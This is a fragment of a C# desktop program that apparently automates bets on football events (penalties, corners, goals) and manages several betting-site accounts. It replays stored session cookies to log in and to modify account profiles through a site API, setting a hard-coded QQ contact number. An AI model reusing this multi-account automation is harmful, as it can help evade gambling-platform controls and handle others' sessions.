                            enventInfo.inputType = 1; //只下大小
                            enventInfo.bangchangType = 0; //只下默认
                            leftForm.setComplete(enventInfo);
                        }
                    }));
                }

            }
            else
            {
                //默认选项且为直接下注的类型
                if (cid.Equals("2086") || cid.Equals("1062")) {

                    if (cid.Equals("2086"))
                    {
                        enventInfo.cid = "2055";//客队点球
                    }
                    else {
                        enventInfo.cid = "1031";//主队点球
                    }
                    this.Invoke(new Action(() => {
                        if (isAuto()
                        &&
                        ((M8checkBox.Checked && dianQiuEnvent == 1)
                        || (NYCheckBox.Checked && dianQiuEnvent == 0)))
                        {
                            leftForm.setComplete(enventInfo);
                        }
                    }));
                    return;
                }
                return;
            }
        }

        // 获取用户当前选中的下单规则 让球或者大小
        public int GetCurrUserSelected()
        {
            if (this.rbRangQiu.Checked)
            {
                return 0;
            }
            else
            {
                return 1;
            }
        }

        //获取搜索的内容
        public void setTextBox1Text(String str)
        {
            textBox1.Text = str.Trim();
        }
        //是否自动下注
        public bool isAuto()
        {
            return autoCheck.Checked;
        }
        //获取半场选择  默认返回0   半场返回1   全场返回2  上半场返回3
        public int GetBanChangSelected()
        {
            if (AutoBanChang.Checked) {
                return 0;
            }

            if (bangCRadio.Checked)
            {
                return 1;
            }

            if (quanCRadio.Checked)
            {
                return 2;
            }

            if (shangBcrBtn.Checked) {
                return 3;
            }
            return 0;
        }
        //获取下單金額选择  默认（全額）返回0  1/2返回1   1/3返回2  1/4返回3  3/4 返回4
        public int GetAmountSelected()
        {
            
                if (z_2_rd.Checked)
                {
                    return 1;
                }
                else if (z_3_rd.Checked)
                {
                    return 2;
                }
                else if (z_4_rd.Checked) // 1/4
                {
                    return 3;
                }
                else if (r_5_1.Checked) // 1/5
                {
                    return 5;
                }
                else if (r_6_1.Checked) // 1/6
                {
                    return 6;
                }
            else
                {
                    return 0;
                }
             
        }
     

        // 消息列表 初始化
        private void MsgShowFormInit()
        {
            // 测试数据
            //EnventShowInfo enventShowInfo = new EnventShowInfo();
            //enventShowInfo.shiDuan = "上半场";
            //enventShowInfo.gameTime = 3700000;
            //enventShowInfo.lianSaiStr = "意大利甲组联赛";
            //enventShowInfo.gameH = "阿特兰大";
            //enventShowInfo.gameG = "拿玻里";
            //enventShowInfo.text = "可能客队炸弹";

            Thread t = new Thread(new ParameterizedThreadStart(this.ShowEventInfo));
            t.SetApartmentState(ApartmentState.STA);
            t.Start(null);
        }
        // 消息列表 显示消息
        private void ShowEventInfo(Object positionObj)
        {
            EnventShowInfo enventShowInfo = (EnventShowInfo)positionObj;

            if (msgShowForm == null || !msgShowForm.Visible || msgShowForm.IsDisposed)
            {
                msgShowForm = null;
                msgShowForm = new MsgShowForm();
                msgShowForm.ShowEvent(enventShowInfo,this);
            }
            else 
            {
                msgShowForm.AddLineInHead(enventShowInfo);
            }
        }
        //比赛点击搜索
        private void gameText_Click(object sender, EventArgs e)
        {
            String text = gameText.Text.ToString();
            int ballType = 0; // 点球
            if (text.Contains("(进球)")) {
                ballType = 1;
                text = text.Replace("(进球)", "");
            }else if (text.Contains("(角球)"))
            {
                ballType = 2;
                text = text.Replace("(角球)", "");
            }

            String[] strs = text.Split('-');
            if (strs.Length > 1) {
                if ((int)gameText.Tag == 1)
                {  //主队
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(),true,ballType);
                }
                else if ((int)gameText.Tag == 2)
                { //客队
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(), false, ballType);
                }
                else
                {
                    searchForHistoryTeam(strs[0].Trim(), strs[1].Trim(), true,ballType);
                }
            }
        }

        // 消息列表 历史消息点击搜索  
        //参数  主队  客队  是否主队  类型
        public void searchForHistoryTeam(String hStr,String gStr,bool isH,int ballType)
        {
            if (!String.IsNullOrEmpty(hStr)&& !String.IsNullOrEmpty(gStr))
            {
                String name = leftForm.getSaiName(hStr, gStr,isH, ballType);
                if (name == null) {
                    if (isH)
                    {
                        name = hStr;
                    }
                    else {
                        name = gStr;
                    }
                }
                this.setTextBox1Text((name));
            }
        }

        private void fitBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.hasFitter = fitBox.Checked;
        }

        private void pingbanCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.isPingBang = pingbanCheckBox.Checked;
           // changeData();

        }
        
      

        private void jiaoqiu_checkBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.jiaoQiuEnble = jiaoqiu_checkBox.Checked;
        }

        private void jiaoQiuTime_CheckedChanged(object sender, EventArgs e)
        {
            Config.jiaoQiuGouXuan = jiaoQiuTime.Checked;
        }

        private void dianQiu_check_CheckedChanged(object sender, EventArgs e)
        {
            Config.dianQiuGouXuan = dianQiu_check.Checked;
            
        }
        private void datuiCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            Config.daTuiEnble = datuiCheckBox.Checked;
        }





        //改变
        private void changeData() {
            for (int i = 0; i < Config.userList.Count; i++) {
                UserInfo user = (UserInfo)Config.userList[i];
                if (!user.tag.Equals("D")) {
                    continue;
                }
                Thread t = new Thread(new ParameterizedThreadStart(this.changeUserInfoD));
                t.Start(i);

            }
        }


        private void changeUserInfoD(object obj) {
            int position = (int)obj;
            UserInfo user =(UserInfo) Config.userList[position];
            if ( !user.tag.Equals("D"))
            {
                return ;
            }

            JObject headJobject = new JObject();
            headJobject["Host"] = user.baseUrl;
            headJobject["Origin"] = user.loginUrl;
            headJobject["X-Requested-With"] = "XMLHttpRequest";
            headJobject["Referer"] = user.loginUrl + "/page/user-center/account/password.html?" + FormUtils.getCurrentTime();
          //  String p = "userMemo=&bankName=" + WebUtility.UrlEncode("中国农业银行")
            //    + "&bankAddress=" + WebUtility.UrlEncode("中国农业银行股份有限公司潮州新洋支行");
          
            String p = "qq=567438948&isDl=false&hyLevel=1&userMemo=" + WebUtility.UrlEncode("")+ "&userColor="+ WebUtility.UrlEncode("");
            String url = user.dataUrl + "/api/user/modifyUserInfo";
            String rlt = HttpUtils.HttpPostHeader(url,p, "application/x-www-form-urlencoded; charset=UTF-8", user.cookie,headJobject);
            MoneyUtils.GetDMoney(user);
        }

        //一键登录
        private void auto_login_btn_Click(object sender, EventArgs e)
        {
            if (loginForm != null) {
                loginForm.allGoLogin();
            }

            /*JObject jObject = new JObject();
            jObject["isDaXiao"] = false;
            jObject["isH"] = true;
            jObject["daTuiGameH"] = "贝卡麦克斯";//主队名字
            jObject["daTuiGameG"] = "岘港";//客队名字
            jObject["sys"] = "BB1";
            jObject["cmd"] = 666;
            jObject["userName"] = "admin4009";
            jObject["version"] = Config.vString;
            OnWebSocketMessAge(jObject.ToString());*/

        }

        private void sishiHou_CheckedChanged(object sender, EventArgs e)
        {
            Config.has40Enbale = sishiHou.Checked;
        }
    }
}
